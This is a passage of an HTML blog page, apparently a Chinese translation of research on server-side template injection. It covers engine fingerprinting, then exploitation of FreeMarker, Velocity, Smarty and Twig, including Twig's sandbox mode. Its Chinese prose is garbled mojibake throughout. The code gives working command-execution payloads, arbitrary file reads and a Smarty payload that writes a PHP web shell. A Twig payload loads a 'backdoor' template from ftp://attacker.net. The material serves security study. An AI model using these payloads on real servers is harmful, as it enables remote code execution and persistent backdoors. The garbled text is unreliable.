ä¸åŒçš„å­—ç¬¦ï¼Œå†é€šè¿‡è¿”å›žçš„é”™è¯¯åˆ¤æ–­ã€‚å½“æ¨¡æ¿å¼•æ“Žå±è”½é”™è¯¯åŽï¼Œè¯¥ç±»å½“æ³•å°±å¤±æ•ˆäº†ï¼Œå¹¶ä¸”æš´åŠ› fuzz ä¹Ÿå¯¹æ”»å‡»è‡ªåŠ¨åŒ–ä¸å‹å¥½ã€‚Burpsuite åˆ™å¯¹ä¸åŒæ¨¡æ¿æŽ¥å—çš„ payload åšäº†ä¸€ä¸ªåˆ†ç±»ï¼Œå¹¶ä»¥æ­¤å¿«é€Ÿåˆ¤æ–­æ¨¡æ¿å¼•æ“Žï¼š</p><p><img src="https://pic4.zhimg.com/80/v2-3321f46859c0be9e93f9ad79f3dd1cd3_720w.jpg" alt="img"></p><p>è¿™é‡Œçš„ç»¿çº¿è¡¨ç¤ºç»“æžœæˆåŠŸè¿”å›žï¼Œçº¢çº¿åä¹‹ã€‚æœ‰äº›æ—¶å€™ï¼ŒåŒä¸€ä¸ªå¯æ‰§è¡Œçš„ payload ä¼šåœ¨ä¸åŒå¼•æ“Žä¸­è¿”å›žä¸åŒçš„ç»“æžœï¼Œæ¯”æ–¹è¯´49ä¼šåœ¨ Twig ä¸­è¿”å›ž49ï¼Œè€Œåœ¨ Jinja2 ä¸­åˆ™æ˜¯7777777ã€‚</p><h2 id="æ¼æ´žåˆ©ç”¨"><a href="#æ¼æ´žåˆ©ç”¨" class="headerlink" title="æ¼æ´žåˆ©ç”¨"></a><strong>æ¼æ´žåˆ©ç”¨</strong></h2><h2 id="è¯»æ–‡æ¡£"><a href="#è¯»æ–‡æ¡£" class="headerlink" title="è¯»æ–‡æ¡£"></a><strong>è¯»æ–‡æ¡£</strong></h2><p>è¯»æ¨¡æ¿æ–‡çŒ®æ˜¯æž„é€  exp çš„ç¬¬ä¸€æ­¥ã€‚ä¸€èˆ¬æ¥è®²ï¼Œæˆ‘ä»¬éœ€è¦å…³æ³¨å¦‚ä¸‹éƒ¨åˆ†ï¼š</p><ul><li>â€˜Template ä½¿ç”¨æ‰‹å†Œâ€™ï¼Œè¿™ä¸€éƒ¨åˆ†é€šå¸¸å‘Šè¯‰æˆ‘ä»¬åŸºæœ¬çš„æ¨¡æ¿è¯­æ³•</li><li>â€˜å®‰å…¨é—®é¢˜â€™ï¼Œåœ¨æ”»å‡»æ¨¡æ¿æ—¶ï¼Œå®ƒé€šå¸¸å¯ä»¥æä¾›æˆ‘ä»¬è®¸å¤šæ€è·¯</li><li>å†…å»ºæ–¹æ³•ï¼Œå‡½æ•°ï¼Œå˜é‡ï¼Œè¿‡æ»¤å™¨</li><li>æ’ä»¶/æ‰©å±•â€”â€”æˆ‘ä»¬å¯ä»¥ä¼˜å…ˆç ”ç©¶é»˜è®¤å¼€å¯çš„</li></ul><h2 id="æŽ¢çŽ¯å¢ƒ"><a href="#æŽ¢çŽ¯å¢ƒ" class="headerlink" title="æŽ¢çŽ¯å¢ƒ"></a><strong>æŽ¢çŽ¯å¢ƒ</strong></h2><p>å½“æˆ‘ä»¬æž„å»ºå‡ºäº†å¯ç”¨ exp åŽï¼Œæˆ‘ä»¬éœ€è¦è€ƒè™‘æˆ‘ä»¬å½“å‰çŽ¯å¢ƒå¯åˆ©ç”¨çš„å‡½æ•°/å¯¹è±¡ã€‚é™¤äº†æ¨¡æ¿é»˜è®¤çš„å¯¹è±¡å’Œæˆ‘ä»¬æä¾›çš„å‚æ•°å¤–ï¼Œå¤§éƒ¨åˆ†æ¨¡æ¿å¼•æ“Žéƒ½æœ‰ä¸€ä¸ªåŒ…å«å½“å‰å‘½åç©ºé—´æ‰€æœ‰ä¿¡æ¯çš„å¯¹è±¡ï¼ˆæ¯”å¦‚ selfï¼‰ï¼Œæˆ–è€…ä¸€ä¸ªå¯ä»¥åˆ—å‡ºæ‰€æœ‰å±žæ€§å’Œæ–¹æ³•çš„å‡½æ•°ã€‚</p><p>å¦‚æžœæ²¡æœ‰è¿™æ ·çš„å¯¹è±¡æˆ–å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦æš´åŠ›æžšä¸¾å˜é‡åã€‚æˆ‘å·²åœ¨ FuzzDB å’Œ Burp Intruder ä¸­å…¬å¸ƒäº† fuzz å­—å…¸ã€‚</p><p>æœ‰äº›æ—¶å€™ï¼Œå¼€å‘è€…ä¹Ÿä¼šåœ¨æ¨¡æ¿ä¸­åŒ…å«äº†ä¸€äº›æ•æ„Ÿä¿¡æ¯ã€‚ä¸è¿‡è¿™è§†æƒ…å†µè€Œå®šï¼Œå› æ­¤ä¸åœ¨è¿™é‡Œè®¨è®ºã€‚</p><h2 id="é»‘ç¨‹åº"><a href="#é»‘ç¨‹åº" class="headerlink" title="é»‘ç¨‹åº"></a><strong>é»‘ç¨‹åº</strong></h2><p>è‡³æ­¤ï¼Œè¯»è€…å·²ç»äº†è§£å¦‚ä½•åˆ©ç”¨è¿™ä¸€æ”»å‡»é¢äº†ã€‚ä½†æ˜¯æˆ‘ä»¬éœ€è¦æé†’è¯»è€…ä¸è¦å±€é™ç›®å…‰äºŽé€šç”¨ç‰¹æ€§ï¼Œæˆ‘ä»¬è¿˜éœ€æ³¨æ„åˆ°ä¸åŒå¼€å‘è€…çš„å®žçŽ°ç»†èŠ‚ã€‚åœ¨ä½™ä¸‹çš„ç¯‡å¹…é‡Œï¼Œæˆ‘ä¼šç”¨æ¨¡æ¿æ³¨å…¥æ¥å®žçŽ°ä»»æ„å¯¹è±¡åˆ›å»ºï¼Œä»»æ„æ–‡ä»¶è¯»å†™ï¼Œè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œä¿¡æ¯æ³„éœ²ä»¥åŠææƒã€‚</p><p>æœ‰äº›æ—¶å€™ï¼Œæ”»ç ´ä¸€ä¸ªç¨‹åºä¸éœ€è¦å¤šå°‘æ—¶é—´ï¼Œæ¯”å¦‚ï¼š{php}echo id;{/php}</p><p>è¿™æ—¶ï¼Œæˆ‘ä»¬åªéœ€é€’äº¤ï¼š</p><pre class=" language-jsp"><code class="language-jsp"><%import osx=os.popen('id').read()%>${x}</code></pre><p>å³å¯</p><p>ä½†æ˜¯è¶Šæ¥è¶Šå¤šçš„æ¨¡æ¿ä¼šæä¾›å®‰å…¨æŽªæ–½ï¼ˆæ¯”æ–¹è¯´æ²™ç®±ï¼Œè¿‡æ»¤ï¼‰æ¥ä¿è¯å®‰å…¨æ€§ï¼Œå› æ­¤å¼€å‘æ¨¡æ¿æ³¨å…¥åŽé—¨è¶Šæ¥è¶Šéš¾äº†ã€‚</p><h2 id="æ¡ˆä¾‹"><a href="#æ¡ˆä¾‹" class="headerlink" title="æ¡ˆä¾‹"></a><strong>æ¡ˆä¾‹</strong></h2><h2 id="FreeMarker"><a href="#FreeMarker" class="headerlink" title="FreeMarker"></a><strong>FreeMarker</strong></h2><p>FreeMaker æ˜¯ Java ä¸‹æœ€å—æ¬¢è¿Žçš„æ¨¡æ¿å¼•æ“Žã€‚å–œå‡ºæœ›å¤–çš„æ˜¯ï¼Œè¿™ä¸ªæ¨¡æ¿çš„æ–‡æ¡£æåˆ°äº†å®‰å…¨é—®é¢˜ï¼š<br>Q:æˆ‘å¯ä»¥å…è®¸ç”¨æˆ·é€’äº¤æ¨¡æ¿å—ï¼Ÿè¿™åˆä»€ä¹ˆå®‰å…¨éšæ‚£å—ï¼Ÿ<br>A: é€šå¸¸æ¥è®²ï¼Œæˆ‘ä»¬ä¸å…è®¸è¿™ä¹ˆåšã€‚é™¤éžç”¨æˆ·æ˜¯ç®¡ç†å‘˜æˆ–è€…å¯ä¿¡ä»»çš„ç”¨æˆ·ã€‚æ¨¡æ¿å’Œ *.java æ–‡ä»¶ä¸€æ ·æœ‰å¨èƒã€‚å¦‚æžœä½ ä¾ç„¶åšæŒè¿™ä¹ˆåšï¼Œé‚£ä¹ˆä½ å¯ä»¥å‚è€ƒ<a href="https://link.zhihu.com/?target=http://freemarker.org/docs/app_faq.html%23faq_template_uploading_security">è¿™ä¸ª</a></p><p>é™¤äº†DoSç­‰ç›¸å¯¹å½±å“è¾ƒå°çš„é—®é¢˜ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†ä¸ªæ–‡çŒ®ï¼š<br>Configuration.setNewBuiltinClassResolverï¼ŒEnvironment.setNewBuiltinClassResolveï¼šå®ƒä»¬åœ¨æ¨¡æ¿ä¸­å¯ä»¥è¿™æ ·è°ƒç”¨ï¼šâ€com.example.SomeClassâ€? new()ï¼Œè™½ç„¶è¿™ä¸¤ä¸ªå‡½æ•°å¯¹FTLåº“ååˆ†é‡è¦ï¼Œä½†æ˜¯ä¸åº”è¯¥å‡ºçŽ°åœ¨ä¸€èˆ¬çš„æ¨¡æ¿é‡Œã€‚new å®ƒä¼šäº§ç”Ÿ  TemplateModelï¼Œè¿™ä¸ªç±»æœ‰å¼•èµ·ä»»æ„ä»£ç æ‰§è¡Œçš„éšæ‚£ã€‚</p><p>è™½ç„¶è¿™ä¸ªæè¿°å¹¶ä¸è¯¦ç»†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç²—ç•¥å¾—çŸ¥newä¼šå¯¼è‡´å®‰å…¨é—®é¢˜ï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹å®ƒçš„æ–‡æ¡£ï¼š</p><p>ç”¨æˆ·å¯ä»¥é€šè¿‡å®žçŽ° TemplateModel æ¥ç”¨ new åˆ›å»ºä»»æ„ Java å¯¹è±¡</p><p>å¦‚æžœä½ æƒ³è®©ç”¨æˆ·ä¸Šä¼ æ¨¡æ¿ï¼Œä½ åº”è¯¥çœ‹<a href="https://link.zhihu.com/?target=http://freemarker.org/docs/ref_builtins_expert.html%23ref_builtin_new">è¿™é‡Œ</a></p><p>TemplateModel æœ‰ä»€ä¹ˆç¥žå¥‡çš„ä¸œè¥¿å‘¢ï¼Ÿæˆ‘ä»¬æ¥çœ‹ä¸€çœ‹ï¼š</p><p><img src="https://pic2.zhimg.com/80/v2-23be041d36b1eba277b4303de9a5bc21_720w.jpg" alt="img"></p><p>Executeï¼è¿™æ˜¯ä¸æ˜¯ä¸€ä¸ªå¯ä»¥æ‰§è¡Œä»£ç çš„åŠŸèƒ½å‘¢ï¼Ÿä¸ºäº†éªŒè¯ Executeï¼Œæˆ‘ä»¬å¯ä»¥ï¼š</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Execute</span><span class="token keyword">implements</span> <span class="token class-name">TemplateMethodModel</span><span class="token comment" spellcheck="true">/*ç»™äºˆFreeMakeræ‰§è¡Œå‘½ä»¤æƒé™ï¼Œå¹¶å°†è¾“å…¥å†…è”åˆ°æ¨¡æ¿é‡Œ*/</span></code></pre><p>æžœç„¶å’Œæˆ‘ä»¬é¢„æ–™çš„ä¸€æ ·ï¼š</p><pre class=" language-smarty"><code class="language-smarty">&lt;#assign ex="freemarker.template.utility.Execute"?new()> $<span class="token smarty"><span class="token delimiter punctuation">{</span> <span class="token function">ex</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span> <span class="token delimiter punctuation">}</span></span>uid=119(tomcat7) gid=127(tomcat7) groups=127(tomcat7)</code></pre><p>è¿™ä¸ª payload ä¼šåœ¨åŽé¢å¤§æ˜¾èº«æ‰‹ã€‚</p><h2 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a><strong>Velocity</strong></h2><p>Velocity åŒæ ·æ˜¯ä¸€æ¬¾å¤‡å—æ¬¢è¿Žçš„æ¨¡æ¿è¯­è¨€ã€‚ç„¶è€Œå®ƒæ²¡æœ‰é»˜è®¤å˜é‡åˆ—è¡¨å’Œ <em>å®‰å…¨é—®é¢˜</em> é¡µé¢å¸®åŠ©æˆ‘ä»¬æž„å»º payloadã€‚ä¸‹é¢å±•ç¤ºäº† Burp Intruder åœ¨æžšä¸¾å˜é‡åæ—¶çš„æˆªå›¾ï¼šï¼ˆå˜é‡ååœ¨ payload è¡Œï¼ŒæœåŠ¡å™¨ç»“æžœåœ¨å…¶å³è¾¹ï¼‰ï¼š</p><p><img src="https://pic4.zhimg.com/80/v2-eca8e9cbc67e9f08bccdb7caae3eefb7_720w.jpg" alt="img"></p><p>è¿™å¹…å›¾ä¸­ï¼Œè¢«é«˜äº®çš„ class èƒ½è¿”å›žå¯¹è±¡ï¼Œçœ‹ä¸ŠåŽ»ååˆ†æœ‰è¶£ã€‚è°·æ­Œä¸€ä¸‹ï¼Œæˆ‘ä»¬å‘çŽ°äº†<a href="https://link.zhihu.com/?target=https://velocity.apache.org/tools/releases/2.0/summary.html">å¦‚ä¸‹æè¿°</a>ï¼š<br>ClassToolï¼šåœ¨æ¨¡æ¿ä¸­å®žçŽ°Javaçš„åå°„ï¼Œé»˜è®¤å‚æ•°ï¼š$key</p><p>è¿™é‡Œæœ‰å‡ ä¸ªå¯åˆ©ç”¨çš„æ–¹æ³•å’Œå±žæ€§ï¼š<br>$class.inspect(class/object/string)ï¼šè¿”å›žæ­£åœ¨å®¡æŸ¥ç±»æˆ–å¯¹è±¡çš„ClassToolå®žä¾‹<br>$class.typeï¼šè¿”å›žè¢«å®¡æŸ¥çš„ç±»</p><p>æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸¤ä¸ªç±»èŽ·å¾—ä»»æ„å¯¹è±¡ä¿¡æ¯ã€‚å†åˆ©ç”¨ç›®æ ‡çš„Runtime.exec()æ‰§è¡Œä»»æ„å‘½ä»¤å—¯ã€‚é€šè¿‡å¦‚ä¸‹æ¨¡æ¿ï¼Œæˆ‘ä»¬å¯ä»¥éªŒè¯è¿™ä¸€ç‚¹ï¼š</p><pre class=" language-jsp"><code class="language-jsp">$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor() //å»¶è¿Ÿäº†5ç§’</code></pre><p>å¾—åˆ° shell å‘½ä»¤è¾“å‡ºæœ‰ç‚¹éº»çƒ¦ï¼ˆæ¯•ç«Ÿjavaï¼‰ï¼š</p><pre class=" language-jsp"><code class="language-jsp">#set($str=$class.inspect("java.lang.String").type)#set($chr=$class.inspect("java.lang.Character").type)#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end//è¾“å‡º tomcat7</code></pre><h2 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a><strong>Smarty</strong></h2><p>Smarty æ˜¯ä¸€æ¬¾ PHP  çš„æ¨¡æ¿è¯­è¨€ã€‚å®ƒä½¿ç”¨å®‰å…¨æ¨¡å¼æ¥æ‰§è¡Œä¸ä¿¡ä»»çš„æ¨¡æ¿ã€‚å®ƒåªè¿è¡Œ PHP ç™½åå•é‡Œçš„å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬ä¸èƒ½ç›´æŽ¥è°ƒç”¨  system()ã€‚ç„¶è€Œæˆ‘ä»¬å¯ä»¥ä»Žæ¨¡æ¿å·²æœ‰çš„ç±»ä¸­è¿›è¡Œä»»æ„è°ƒç”¨ã€‚è€Œæ–‡æ¡£è¡¨ç¤ºæˆ‘ä»¬å¯ä»¥é€šè¿‡ $smarty æ¥èŽ·å–è®¸å¤šçŽ¯å¢ƒå˜é‡ï¼ˆæ¯”å¦‚å½“å‰å˜é‡çš„ä½ç½®  $SCRIPT_NAME)ã€‚åŽé¢ï¼Œæˆ‘ä»¬åˆå‘çŽ°äº† getStreamVariable:</p><p><img src="https://pic2.zhimg.com/80/v2-2d249e8cad5c5d0ed515abc5524b1051_720w.jpg" alt="img"></p><p>è¿™ä¸ªå‡½æ•°èƒ½ä»»æ„è¯»å–æœ‰è¯»å†™æƒé™çš„æ–‡ä»¶ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token punctuation">{</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getStreamVariable</span><span class="token punctuation">(</span>"file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///proc/self/loginuid")}</span><span class="token number">1000</span><span class="token punctuation">{</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getStreamVariable</span><span class="token punctuation">(</span><span class="token variable">$SCRIPT_NAME</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token delimiter">&lt;?php</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"SMARTY_DIR"</span><span class="token punctuation">,</span><span class="token string">'/usr/share/php/Smarty/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token constant">SMARTY_DIR</span><span class="token punctuation">.</span><span class="token string">'Smarty.class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>ä¸ä»…å¦‚æ­¤ï¼Œæˆ‘ä»¬èƒ½ä»»æ„è°ƒç”¨é™æ€æ–¹æ³•ï¼Œè¿™å½“ä¸­åŒ…æ‹¬ä¸€ä¸ªå¯ä»¥åˆ›å»ºå’Œé‡å†™æ–‡ä»¶çš„æ–¹æ³•public  function writeFile($_filepath, $_contents, Smarty  $smarty)ã€‚é€šè¿‡è¯¥æ–¹æ³•ï¼Œæˆ‘ä»¬èƒ½è½»æ¾åœ¨webç›®å½•ä¸‹åˆ›å»ºåŽé—¨ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å¿…é¡»ä¸º Smarty å¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æƒ³åŠžæ³•å¾—åˆ°  Smarty å¯¹è±¡çš„å¼•ç”¨ã€‚</p><p>å¹¸è¿çš„æ˜¯ï¼Œself::clearConfigå¸®åŠ©æˆ‘ä»¬èŽ·å–å¯¹è±¡ï¼š</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> function <span class="token function">clearConfig</span><span class="token punctuation">(</span>$varname <span class="token operator">=</span> null<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> Smarty_Internal_Extension_Config<span class="token operator">:</span><span class="token operator">:</span><span class="token function">clearConfig</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token punctuation">,</span> $varname<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>æœ€åŽï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ›å»ºåŽé—¨äº†ï¼</p><pre class=" language-php"><code class="language-php"><span class="token punctuation">{</span>Smarty_Internal_Write_File<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token variable">$SCRIPT_NAME</span><span class="token punctuation">,</span><span class="token string">"&lt;?php passthru($_GET['cmd']); ?>"</span><span class="token punctuation">,</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">clearConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h2 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a><strong>Twig</strong></h2><p>Twig å’Œ Smarty  ç±»ä¼¼ï¼Œä¸è¿‡æˆ‘ä»¬ä¸èƒ½ç”¨å®ƒè°ƒç”¨é™æ€æ–¹æ³•ã€‚å¹¸è¿çš„æ˜¯ï¼Œå®ƒæä¾›äº† _selfï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦æš´åŠ›æžšä¸¾å˜é‡åã€‚è™½ç„¶ _self æ²¡ä»€ä¹ˆæœ‰ç”¨çš„æ–¹æ³•ï¼Œå®ƒæä¾›äº†æŒ‡å‘ Twig_Environment çš„env å±žæ€§ã€‚Twig_Environment å…¶ä¸­çš„ setCache æ–¹æ³•åˆ™èƒ½æ”¹å˜ Twig åŠ è½½  PHP æ–‡ä»¶çš„è·¯å¾„ã€‚è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ”¹å˜è·¯å¾„å®žçŽ° RFIäº†ï¼š</p><pre class=" language-twig"><code class="language-twig"><span class="token tag"><span class="token ld"><span class="token punctuation">{{</span></span><span class="token property">_self</span><span class="token punctuation">.</span><span class="token property">env</span><span class="token punctuation">.</span><span class="token property">setCache</span><span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>ftp://attacker.net:2121<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token rd"><span class="token punctuation">}}</span></span></span><span class="token tag"><span class="token ld"><span class="token punctuation">{{</span></span><span class="token property">_self</span><span class="token punctuation">.</span><span class="token property">env</span><span class="token punctuation">.</span><span class="token property">loadTemplate</span><span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>backdoor<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token rd"><span class="token punctuation">}}</span></span></span></code></pre><p>ä½†æ˜¯ï¼ŒPHP é»˜è®¤ç¦æ­¢è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆå…³é—­ allow_url_includeï¼‰ï¼Œå› æ­¤ä¸Šè¿° payload ä¸èƒ½ç”Ÿæ•ˆã€‚è¿›ä¸€æ­¥æŽ¢ç´¢ï¼Œæˆ‘ä»¬åœ¨ getFilter  é‡Œå‘çŽ°äº†å±é™©å‡½æ•° call_user_funcã€‚é€šè¿‡ä¼ é€’ä¼ é€’å‚æ•°åˆ°è¯¥å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨ä»»æ„ PHP å‡½æ•°ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filterCallbacks</span> <span class="token keyword">as</span> <span class="token variable">$callback</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">!==</span> <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$callback</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">registerUndefinedFilterCallback</span><span class="token punctuation">(</span><span class="token variable">$callable</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filterCallbacks</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$callable</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>æˆ‘ä»¬åªéœ€æ³¨å†Œ exec ä¸º filter çš„å›žè°ƒå‡½æ•°ï¼Œå¹¶å¦‚æ­¤è°ƒç”¨ï¼š</p><pre class=" language-twig"><code class="language-twig"><span class="token tag"><span class="token ld"><span class="token punctuation">{{</span></span><span class="token property">_self</span><span class="token punctuation">.</span><span class="token property">env</span><span class="token punctuation">.</span><span class="token property">registerUndefinedFilterCallback</span><span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>exec<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token rd"><span class="token punctuation">}}</span></span></span><span class="token tag"><span class="token ld"><span class="token punctuation">{{</span></span><span class="token property">_self</span><span class="token punctuation">.</span><span class="token property">env</span><span class="token punctuation">.</span><span class="token property">getFilter</span><span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token rd"><span class="token punctuation">}}</span></span></span><span class="token other">//è¿”å›žç»“æžœï¼š uid=1000(k) gid=1000(k) groups=1000(k),10(wheel)</span></code></pre><h2 id="Twigï¼ˆæ²™ç®±æ¨¡å¼ï¼‰"><a href="#Twigï¼ˆæ²™ç®±æ¨¡å¼ï¼‰" class="headerlink" title="Twigï¼ˆæ²™ç®±æ¨¡å¼ï¼‰"></a><strong>Twigï¼ˆæ²™ç®±æ¨¡å¼ï¼‰</strong></h2><p>Twig çš„æ²™ç®±æ¨¡å¼æœ‰é¢å¤–çš„é™åˆ¶ã€‚å®ƒä¼šç¦ç”¨ä¸€éƒ¨åˆ†å‡½æ•°ï¼ˆåŒ…æ‹¬å¼€å‘è€…æä¾›çš„å¯¹è±¡ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬å¹¶ä¸èƒ½è°ƒç”¨æœ‰ä»·å€¼çš„ä¸œè¥¿ã€‚ä¸‡å¹¸çš„æ˜¯ï¼Œè¿™éƒ¨åˆ†ä»£ç å¸®åŠ©æˆ‘ä»¬çªç ´é™åˆ¶ï¼š</p><pre class=" language-twig"><code class="language-twig"><span class="token other">public function checkMethodAllowed($obj, $method){  if ($obj instanceof Twig_TemplateInterface || $obj instanceof Twig_Markup) {  return true;}</span></code></pre><p>è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨å®žçŽ° Twig_TemplateInterface çš„å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ç®€ä»‹ä½¿ç”¨ _self.ï¼Œ_self.ä¸­çš„ displayBlock è®©æˆ‘ä»¬æ›´ä¸Šä¸€å±‚æ¥¼ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">displayBlock</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$context</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$blocks</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$useBlocks</span> <span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$useBlocks</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$blocks</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$template</span> <span class="token operator">=</span> <span class="token variable">$blocks</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$block</span> <span class="token operator">=</span> <span class="token variable">$blocks</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blocks</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$template</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blocks</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$block</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blocks</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$template</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token variable">$block</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">null</span> <span class="token operator">!==</span> <span class="token variable">$template</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>      <span class="token variable">$template</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$block</span><span class="token punctuation">(</span><span class="token variable">$context</span><span class="token punctuation">,</span> <span class="token variable">$blocks</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Twig_Error</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token 